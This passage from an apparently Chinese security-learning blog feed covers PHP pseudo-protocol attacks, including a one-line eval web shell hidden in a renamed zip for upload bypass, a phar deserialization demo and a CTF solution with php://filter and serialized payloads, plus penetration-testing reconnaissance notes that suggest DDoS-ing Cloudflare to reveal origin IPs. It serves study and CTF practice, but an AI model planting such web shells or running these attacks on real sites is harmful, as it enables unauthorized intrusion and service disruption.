class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payloadL:</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">directoryiterator</span>(<span class="string">&quot;glob:///*&quot;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__tostring().<span class="string">&#x27; &#x27;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#glob:///*会列出根目录下的文件</span></span><br><span class="line"><span class="comment"># glob://*会列出open_basedir允许目录下的文件</span></span><br></pre></td></tr></table></figure><h3 id="opendir-readdir-glob"><a href="#opendir-readdir-glob" class="headerlink" title="opendir()+readdir()+glob://"></a>opendir()+readdir()+glob://</h3><p>  同样只能列出根目录已经open_basedir()允许的目录</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ( <span class="variable">$b</span> = opendir(<span class="string">&#x27;glob:///*&#x27;</span>) ) &#123;</span><br><span class="line">    <span class="keyword">while</span> ( (<span class="variable">$file</span> = readdir(<span class="variable">$b</span>)) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    closedir(<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h2><ul><li><p>phar:// — PHP 归档，将多个文件组合成一个文件</p></li><li><p>不受<code>allow_url_fopen</code>、<code>allow_url_include</code>影响</p></li><li><p>运用：</p><p><strong>1、绕过上传限制</strong></p><p>可以利于phar://绕过一些上传限制，多数情况下搭配文件包含使用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 构造木马shell.php-&gt;(压缩)xxx.zip-&gt;(修改后缀)xxx.jpg-&gt;上传-&gt;phar://xxx.jpg/shell.php</span></span><br><span class="line"><span class="number">1</span>、构造木马 shell.php: </span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="number">2</span>、将shell.php压缩，并修改后缀名为jpg：xxx.jpg(实际是带有文件shell.php但修改了后缀名的压缩包)</span><br><span class="line"><span class="number">3</span>、上传xxx.jpg并配合文件包含解析木马（payload：<span class="string">&#x27;phar://xxx.jpg/shell.php&#x27;</span>）：</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;phar://xxx.jpg/shell.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/25/xKtb5WPdZQJFaEN.png"></p><p><strong>2、phar反序列化漏洞</strong></p><ul><li><p>（ps : 也是反序列化漏洞，但无需借助unserialize()函数）</p></li><li><p>PHP反序列化漏洞通常是<strong>借助unserialize()函数</strong><br>但<strong>利用phar:// 伪协议</strong>也可以触发PHP反序列化漏洞：<br>1、phar文件以序列化的形式存储用户自定义的meta-data；<br>2、当使用phar://读取phar文件时，就会反序列化meta-data储存的信息</p></li><li><p><strong>利用条件</strong>：(ps:由此可以知道如何修复漏洞咯~)<br><code>可以上传phar文件</code><br><code>有可用魔术方法</code><br><code>文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤</code></p></li><li><p><strong>受影响的文件操作函数</strong>：(参考 zsx师傅<a href="https://blog.zsxsoft.com/post/38">Phar与Stream Wrapper造成PHP RCE的深入挖掘</a>)可知：<br>除了<code>所有文件函数</code>，只要是函数的实现过程直接或间接调用了<code>php_stream_open_wrapper</code>的函数，都可能触发phar反序列化漏洞（具体看zsx师傅的博客，写的很明了~）<br><img src="https://i.loli.net/2021/02/25/MT25UaKWSXCAl9i.png" alt="源自创宇测试"></p></li><li><p>phar文件：<br>在软件中，PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发</p><ul><li><code>php&gt;=5.3</code>：默认开启支持<code>Phar</code>，文件状态为只读(<code>phar.readonly=on</code>)，而且使用phar文件不需要任何配置。php使用phar://伪协议来解析phar文件的内容。<br>ps：需<code>php.ini</code>中令 <code>phar.readonly=off</code>并去掉其前面的分号<code>;</code>否则无法生成phar文件</li></ul></li><li><p>phar文件结构：      </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> stub</span><br><span class="line">phar文件的标志，必须以 xxx <span class="comment"><span class="keyword">__HALT_COMPILER</span>();?&gt; 结尾，否则phar不会识别此部分。xxx可以为自定义内容。</span></span><br><span class="line"><span class="comment">2. manifest</span></span><br><span class="line"><span class="comment">phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分会以序列化的形式存储用户自定义的meta-data，这里是漏洞利用的关键所在,正是因为meta-data是以序列化的形式存储</span></span><br><span class="line"><span class="comment">3. content</span></span><br><span class="line"><span class="comment">被压缩文件的内容，通常情况下这里是可以随意输入的</span></span><br><span class="line"><span class="comment">4. signature (可空)</span></span><br><span class="line"><span class="comment">签名，放在末尾。</span></span><br></pre></td></tr></table></figure></li><li><p>demo:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$string</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Phar create done&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">&quot;test.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;test.phar&quot;</span>);<span class="comment">#.phar文件，(后缀名必须为phar)</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php  __HALT_COMPILER(); ?&gt;&quot;</span>);<span class="comment">#stub(1)</span></span><br><span class="line"><span class="comment">#检测图片头时，可以添加gif头来绕过：GIF89a</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$o</span>-&gt;string = <span class="string">&quot;bphar&quot;</span>;<span class="comment">#类的属性</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>);<span class="comment">#将自定义的meta-data存入manifest(2)</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;bphar.txt&quot;</span>,<span class="string">&quot;bphar&quot;</span>); <span class="comment">#添加压缩文件(3)</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();<span class="comment">#签名自动计算(4)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/25/QIKqF6MvL9Tif7x.png" alt="创建成功"><br><img src="https://i.loli.net/2021/02/25/w8cvt7eCQpHMbEj.png" alt="test.phar文件结构"><br>在使用Phar:// 协议流解析Phar文件时，Meta-data中的内容都会进行反序列化<br>(也就是phar文件中的反序列化部分)</p></li></ul></li><li><p>利用：</p><ol><li>上传phar文件，并借助phar://协议访问phar文件，从而将Meta-data中的内容反序列化</li><li>在创建时必须是phar后缀（$phar = new Phar(“exp.phar”); //.phar文件）<br>上传时为了绕过限制，则可以修改文件后缀、添加图片头从而达到上传的目的</li></ol></li></ul><h2 id="例题（data-、php-input、php-filter）"><a href="#例题（data-、php-input、php-filter）" class="headerlink" title="例题（data://、php://input、php://filter）"></a>例题（data://、php://input、php://filter）</h2><blockquote><p>[ZJCTF 2019]NiZhuanSiWei</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>(); </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line"><span class="variable">$password</span> = unserialize(<span class="variable">$password</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>考点有三：</p><ol><li><p>绕过file_get_contents()<br>a、使用php://input伪协议绕过（需开启allow_url_include）<br>​    ① 将要<code>GET</code>的参数<code>?xxx=php://input</code><br>​    ② 用<code>post</code>方法传入<code>想要file_get_contents()函数返回的值</code></p><p><img src="https://i.loli.net/2021/02/24/EkFIO635YwAoiTm.png"></p><p> b、用data://伪协议绕过 ,<code>?text=data://text/plain,welcome to the zjctf</code><br>将url改为：<code>?xxx=data://text/plain;base64,(base64编码的内容)</code></p><pre><code>或    改为：`?xxx=data:text/plain,(url编码的内容)`</code></pre><p><img src="https://i.loli.net/2021/02/24/GD46ewrWXPJY9q2.png"></p></li><li><p>利用php://filter获取useless.php源码<br><code>php://filter/read=convert.base64-encode/resource=useless.php</code></p></li><li><p>反序列化获取flag<br><code>password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于一些计划（的实施情况）</title>
      <link href="2021/02/18/%E8%BF%91%E6%9C%9F%E7%9A%84%E4%B8%80%E4%BA%9B%E8%AE%A1%E5%88%92/"/>
      <url>2021/02/18/%E8%BF%91%E6%9C%9F%E7%9A%84%E4%B8%80%E4%BA%9B%E8%AE%A1%E5%88%92/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><!-- more --><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近没啥动劲，虚度了几天，想想可能是因为没有计划的原因。所以决定写出来==</p><p>（2021-01-29 至 2021-02-18）</p><h1 id="详情"><a href="#详情" class="headerlink" title="详情"></a>详情</h1><p>1、<del>完成寒假任务的那些</del><br>（马马虎虎完成；到后面大概是内网的学习？打算把vulhub的环境都复现一下）<br>（写出来是这么写，做不做得还是一个问题）</p><p>2、<del>关于php的学习，经过这次训练赛，发现对php其实并不熟络(之前看只是看个简单的结构)，php是非常重要的，相对的java也是啦，计划就是跟着官方文档。（各种函数遇到就记一下，慢慢积累）</del><br>（意料之中的没有完成呢，教练我还有机会吗）</p><p>3、尽量每天都刷一下ctf题！！！刷题是扩充知识面的好方法，重在这个过程学习到的新的知识<br>（这个大概就做了三四道题。。不过确实是需要刷题的，时间不是没有就是拿来玩了。。）</p><p>4、<del>记得看一下带回来的那本《逆向工程核心原理》，还有IDA的使用。经过这次训练赛，对程序逆向分析挺有兴趣的(也可能是出的太简单了但做出来还是开心hh)。总而言之，逆向分析需要的核心能力也是代码审计，要点上</del><br>（Oh no！我跟本没打开过！！！回到家我根本不可能看书，而且我还又买了三本，这几本东西又大又厚，开学必须看完！！！必须！！）</p><p>5、<del>还有各种pdf扫描滴书都要看看</del><br>（买实体书了，页数太多，页数少还好，页数一多有点不习惯，还是花钱买了本实体的）</p><p>6、<del>学习kali的工具，kali许多工具确实有很多帮助，也是非常基础的！！！</del><br>（目前为止就看了nc，而且好像忘的差不多了）</p><p>7、锻炼身体。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>虽然做不完是预料中的事，但是至少做了。。所以我打算下次安排更多事，总会做这么几件的</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试前的一些信息收集</title>
      <link href="2021/02/16/%E6%B8%97%E9%80%8F%E5%89%8D%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>2021/02/16/%E6%B8%97%E9%80%8F%E5%89%8D%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><!-- more --><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>刚开始学习的时候就听过：<code>渗透测试的本质就是信息收集</code>，但对这句话的理解其实并不深刻</p><p>这次先大致了解一下信息收集的过程和一些工具，具体的还需要进一步实践ya</p><p>本篇记录一些思路、工具等等</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>思路发散，不择手段，发现网络中的漏洞。授权范围下，只要最终达到目标，路径不重要</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><blockquote><p>信息收集是渗透测试开始前至关重要的一步，可以让我们对目标的整体有大致的了解，从而选择较为薄弱的方向进行进一步渗透。</p><p>信息搜集大致流程：</p><p>首先拿到目标的域名和ip，如果有cdn的情况，先绕过cdn得到真实ip；</p><p>然后根据域名查找子域名，扫描真实ip的全端口；C段也有可能存在目标的资产，先判断ip的isp信息，若是云服务器则不必扫描C段；</p><p>找到的子域名也要查询ip、全端口等信息，判断目标拥有资产的ip范围；</p><p>查看源代码、页面报错、github搜源码泄露、扫描目录、旁站、fofa、google hack语法进一步搜索目标信息记录下来。</p></blockquote><h3 id="获取目标域名"><a href="#获取目标域名" class="headerlink" title="获取目标域名"></a>获取目标域名</h3><p>确定测试目标，寻找目标主站，记录域名</p><blockquote><p>方法：<br>搜索引擎、企业相关（天眼查、企查查、启信宝(这三种软件仅对内地目标有效) 以及招聘信息等等）</p></blockquote><h3 id="挖掘子域名"><a href="#挖掘子域名" class="headerlink" title="挖掘子域名"></a>挖掘子域名</h3><p>（找到的子域名也要查询ip、端口等信息，判断目标拥有资产的ip范围）</p><blockquote><p>方法：</p><p><strong>搜索引擎</strong>：<br>google site: domain.com -www（google语法）</p><p>nslookup -qt=MX domain 查邮服</p><p><strong>在线网站</strong>：</p><p><a href="https://site.ip138.com/">同iP网站域名iP查询</a>（IP，旁站，whois，快照）<br><a href="http://ip.t086.com/whois.php">IP Whois查询</a>（whois，ip物理地址）<br><a href="https://dns.aizhan.com/">IP反查域名</a>（ip反查，whois反查）<br><a href="https://phpinfo.me/domain/">在线子域名查询 (phpinfo.me)</a></p><p><strong>DNS数据集平台</strong>：<br><a href="https://dnsdumpster.com/">DNSdumpster.com - dns recon and research, find and lookup dns records</a><br><a href="https://www.virustotal.com/gui/home/search">VirusTotal</a></p><p><strong>SSL证书</strong>：<br><a href="https://transparencyreport.google.com/https/certificates">网络上的 HTTPS 加密 – Google 透明度报告</a><br><a href="https://developers.facebook.com/tools/ct/">证书透明度监控 - Facebook 开发者</a><br><a href="https://myssl.com/ssl.html">SSL状态检测 (myssl.com)</a><br><a href="https://crt.sh/">crt.sh</a><br><a href="https://censys.io/">Censys</a></p><p><strong>子域名扫描器</strong>：利用字典暴力枚举<br><code>layer</code><br><code>subdomainbrute</code>(python2 subdomainsbrute domain.com)<br><code>fiere</code>(fierce -dns domain.com) ps：kali 自带</p><p><strong>爬虫</strong>(如burpsuite spider)、<strong>页面源代码</strong>、<strong>F12</strong>、<strong>查询dns解析记录</strong>，<strong>dnslog</strong></p><p><strong>域传送漏洞</strong>：<br>对目标所在的DNS服务器进行漏洞利用，能获取目标所在DNS服务器中的记录，属于很老的漏洞，对于特定的目标几乎很难能找到该漏洞的存在。但实践中不妨尝试一下</p></blockquote><h3 id="获取网站信息"><a href="#获取网站信息" class="headerlink" title="获取网站信息"></a>获取网站信息</h3><p>收集网站的各种信息如：服务器、操作系统、编程语言、cms等等</p><blockquote><p>方法：</p><p>1、浏览器插件<code>wappalyzer</code>,可以识别网站采用了那些web技术，如图为扫描csdn某博客<br>也可以判断一些cms还有cdn的使用，总之就是非常好用啦，但也不是万能的</p><p><img src="https://i.loli.net/2021/02/16/uCDEZf4rFS7h1JW.png"></p><p>2、burpsuite spider爬取、F12网络溯源</p><p>3、抓包，404，大小写敏感</p><p>4、底部、源码的版权信息</p><p>5、网站</p><p><a href="https://fofa.so/">网络空间安全搜索引擎，网络空间搜索引擎，网络空间测绘，安全态势感知 - FOFA网络空间测绘系统</a></p><p><a href="https://www.virustotal.com/gui/home/upload">VirusTotal</a></p><p>指纹识别：</p><p><a href="https://whatweb.net/">WhatWeb - Next generation web scanner.</a></p><p><a href="https://www.yunsee.cn/">云悉指纹</a></p><p><a href="http://whatweb.bugscaner.com/look/">在线指纹识别,在线cms识别小插件–在线工具 (bugscaner.com)</a></p><p><a href="https://anquan.baidu.com/product/secindex?industry=total">安全指数 (baidu.com)</a></p><p><a href="https://github.com/iceyhexman/onlinetools">iceyhexman/onlinetools</a>（在线demo不开放，只能自己下源码了）</p></blockquote><blockquote><p><strong>判断cms</strong></p><p>除了上述方法，还可以主动寻找网站相关信息：</p><p>关键字、url特征、meta特征、scrip特征</p><p>robots.txt、网站路径特征、网站静态资源、网站目录信息<br>cookie、请求头、404<br>除此之外还可以比较网站独有文件的hash md5，比如网站图标favicon.ico，或者某固定的头像等</p></blockquote><h3 id="获取真实ip"><a href="#获取真实ip" class="headerlink" title="获取真实ip"></a>获取真实ip</h3><p>确认目标位置，目标可能使用CDN/云防线/反向代理等，这时我们的ping命令无法直接将请求传递到真实的服务器上，而是经过一层设置对该请求进行转向，导致到我们不能获取到真实服务器的开放端口等信息进行收集。</p><h4 id="检测是否存在cdn"><a href="#检测是否存在cdn" class="headerlink" title="检测是否存在cdn"></a>检测是否存在cdn</h4><blockquote><p><strong>多地ping</strong></p><p>因为 CDN 的特性，不同的地理位置会择优选择不同的线路，所以可以使用多地 PING 检测是否存在 CDN 。</p><p>(使用各种多地 ping 的服务，查看对应 IP 地址是否唯一，如果不唯一多半是使用了CDN)</p><p>可进行多地ping的网站：<br><a href="http://dig.ping.pe/">Ping, mtr, dig and TCP port check from multiple locations</a>（多地ping | dig）<br><a href="http://ping.chinaz.com/">多个地点Ping服务器,网站测速 - 站长工具 (chinaz.com)</a><br><a href="https://ping.aizhan.com/">网站测速工具_超级ping _多地点ping检测 - 爱站网 (aizhan.com)</a></p><p><strong>nslookup</strong><br>可以查询 DNS 的记录，查看域名解析是否正常，如果返回域名解析对应多个 IP 地址多半是使用了 CDN。</p><p>使用了cdn加速，返回多个ip地址<br><img src="https://i.loli.net/2021/02/16/jM3uxCfEziSTweb.png" alt="使用了cdn加速"></p><p>未使用cdn加速，仅返回单一ip地址<br><img src="https://i.loli.net/2021/02/16/4suZmKUiRWFIqnx.png" alt="未使用cdn加速"></p><p>使用了dns负载均衡<br><img src="https://i.loli.net/2021/02/16/l37GUiKgsvBTJwz.png"></p><p><strong>dig</strong><br>dig(域信息搜索器)命令是用于询问 DNS 域名服务器的灵活的工具。它提供了来自被要求的，返回名称服务DNS的查询和显示的答案</p><p>使用<code>dig +short url</code>结果如下：<br><img src="https://i.loli.net/2021/02/16/BtfoiO7DEwGZMeI.png"></p></blockquote><h5 id="关于cdn和负载均衡"><a href="#关于cdn和负载均衡" class="headerlink" title="关于cdn和负载均衡"></a>关于cdn和负载均衡</h5><blockquote><p><strong>CDN（Content Delivery Network）</strong>：</p><p>内容分发网络，是构筑在Internet上的一种先进的流量分配网络。（根据用户位置将请求重定向到最近的服务节点）通过在现有的Internet中增加一层新的网络架构，使用户可以就近取得所需内容，提高用户访问网站的响应速度和安全性。</p><p>也就是说：分布在各地的服务器会复制、缓存主服务器的数据，当用户请求时服务器就会就近提供最近的cdn服务器，使得用户的访问速度得到提升，即所谓的cdn加速</p><p><strong>负载均衡（Load Balance）</strong>：</p><p>对工作任务进行平衡、分摊到多个操作单元上执行，可以提高服务器响应速度及利用效率，避免软件或者硬件模块出现单点失效，解决网络拥塞问题。</p><p>比方说老板安排了很多工作给小明，工作量大到小明无法完成，于是小明以一杯奶茶的代价请求小红帮他完成任务。</p><p>类似的客户端将请求发送至服务器，然而一台服务器是无法承受很高的并发量，我们就会将请求转发到其他服务器（当然真正的负载均衡架构并不是由一台server转发到另一台server，而在客户端与服务器端中间加入了一个负责分配请求的负载均衡硬件（软件））</p></blockquote><h4 id="绕过cdn"><a href="#绕过cdn" class="headerlink" title="绕过cdn"></a>绕过cdn</h4><blockquote><p><strong>dns解析</strong>：<br>查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录，相关查询网站有：<br><a href="https://dnsdb.io/zh-cn/">DNSDB</a>###DNS查询<br><a href="https://x.threatbook.cn/">微步在线威胁情报社区 (threatbook.cn)</a>###微步在线<br><a href="https://sitereport.netcraft.com/?url=">Bad Request | Netcraft</a> ###在线域名信息查询<br><a href="http://viewdns.info/">http://viewdns.info/</a> ###DNS、IP等查询<br><a href="https://tools.ipip.net/cdn.php">全球 CDN 服务商查询_专业的 IP 地址库_IPIP.NET</a>###CDN查询IP<br><a href="https://securitytrails.com/">SecurityTrails</a></p><p><strong>子域名</strong>：<br>cdn的价格使得许多网站可能只给主站或者流量大的子站做了cdn，而很多小站子站点又跟主站在同一台服务器或者同一个C段内，此时就可以通过查询子域名对应的 IP 来辅助查找网站的真实IP</p><p><strong>网络空间引擎</strong>：<br><a href="https://www.zoomeye.org/">钟馗之眼</a>、<a href="https://censys.io/">Home - Censys</a>、<a href="https://www.shodan.io/">Shodan</a>、<a href="https://fofa.so/">fofa</a></p><p>**邮件探测(MX记录)**：<br>(其他一些网站返回的内容也可能存在ip)<br>通过网站提供的邮件发送功能，如注册时的邮箱验证、RSS邮件订阅等，网站会发送邮件至自己的邮箱中，再查看其邮件原文内容，邮件源码中存在的IP地址有可能就是其真实的IP。</p><p><strong>HTTPS证书查询</strong>：<br>工具<a href="https://censys.io/%EF%BC%8C%E8%AF%A5%E5%B7%A5%E5%85%B7%E4%B9%9F%E6%98%AF%E8%83%BD%E8%BF%87%E5%85%A8%E7%BD%91%E6%94%B6%E9%9B%86%E7%AB%99%E7%82%B9%E7%9A%84https%E8%AF%81%E4%B9%A6%E5%8F%8Aip%E5%9C%B0%E5%9D%80%EF%BC%8C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E8%AF%A5%E5%B7%A5%E5%85%B7%E8%BF%9B%E8%A1%8C%E6%9F%A5%E6%89%BE%E3%80%82">https://censys.io/，该工具也是能过全网收集站点的https证书及ip地址，也可以利用该工具进行查找。</a></p><p><strong>SSL证书</strong>：<br><a href="https://transparencyreport.google.com/https/certificates">网络上的 HTTPS 加密 – Google 透明度报告</a><br><a href="https://developers.facebook.com/tools/ct/">证书透明度监控 - Facebook 开发者</a><br><a href="https://myssl.com/ssl.html">SSL状态检测 (myssl.com)</a><br><a href="https://crt.sh/">crt.sh</a><br><a href="https://censys.io/">Censys</a></p><p><strong>偏远地区访问</strong><br>在偏远地区的服务器（或者国外的服务器）访问时，可能不会访问到 CDN 节点，而是直接访问服务器真实 ip</p><p><strong>奇特的 ping</strong><br>比如可能有些地方，使用的 CDN 都是以 <a href="http://www.xxx.edu.cn,例如/">www.xxx.edu.cn，例如</a> <a href="http://www.cuit.edu.cn,www.jwc.cuit.edu.cn/">www.cuit.edu.cn,www.jwc.cuit.edu.cn</a><br>可能去掉前缀的 www，就可能绕过 CDN 了，猜测应该是类似于 Apache VirtualHost</p><p><strong>利用老域名</strong><br>在换新域名时，常常将 CDN 部署到新的域名上，而老域名由于没过期，可能未使用 CDN，然后就可以直接获取服务器真实 ip。<br>例如 patrilic.top &gt; patrilic.com<br>域名更新时，可能老域名同时解析到真实服务器，但是没有部署 CDN<br>这个可以通过搜集域名备案的邮箱去反查，可能会有意外收获</p><p><strong>favicon_hash 匹配</strong><br>利用 shodan 的 <strong>http.favicon.hash</strong> 语法，来匹配 icon 的 hash 值, 直接推:<br><a href="https://github.com/Ridter/get_ip_by_ico/blob/master/get_ip_by_ico.py">https://github.com/Ridter/get_ip_by_ico/blob/master/get_ip_by_ico.py</a></p><p><strong>CloudFlare Bypass</strong><br>免费版的 cf，我们可以通过 DDOS 来消耗对方的流量，只需要把流量打光，就会回滚到原始 ip<br>还有利用 cloudflare 的改 host 返回示例:<br><a href="https://blog.detectify.com/2019/07/31/bypassing-cloudflare-waf-with-the-origin-server-ip-address/">https://blog.detectify.com/2019/07/31/bypassing-cloudflare-waf-with-the-origin-server-ip-address/</a></p><p><strong>暴力匹配</strong><br>找到目标服务器 IP 段后，可以直接进行暴力匹配 ，使用 masscan 扫描 HTTP banner，然后匹配到目标域名的相同 banner</p><p><strong>F5 LTM解码法</strong><br>当服务器使用F5 LTM做负载均衡时，通过对set-cookie关键字的解码真实ip也可被获取，例如：Set-Cookie: BIGipServerpool_8.29_8030=487098378.24095.0000，先把第一小节的十进制数即487098378取出来，然后将其转为十六进制数1d08880a，接着从后至前，以此取四位数出来，也就是0a.88.08.1d，最后依次把他们转为十进制数10.136.8.29，也就是最后的真实ip。</p></blockquote><p>参考链接：<br><a href="https://cloud.tencent.com/developer/article/1520358">绕过 CDN 寻找真实 IP 地址的各种姿势 - 云+社区 - 腾讯云 (tencent.com)</a><br><a href="https://www.cnblogs.com/qiudabai/p/9763739.html">11种绕过CDN查找真实IP方法 - STARTURN - 博客园 (cnblogs.com)</a></p><h3 id="扫描端口"><a href="#扫描端口" class="headerlink" title="扫描端口"></a>扫描端口</h3><p><a href="https://fofa.so/">网络空间安全搜索引擎，网络空间搜索引擎，网络空间测绘，安全态势感知 - FOFA网络空间测绘系统</a><br>Routerscan，御剑，K8Cscan，nmap，messcan<br><a href="https://tool.lu/portscan/">端口扫描 - 在线工具 (tool.lu)</a></p><h3 id="扫描旁站、c段"><a href="#扫描旁站、c段" class="headerlink" 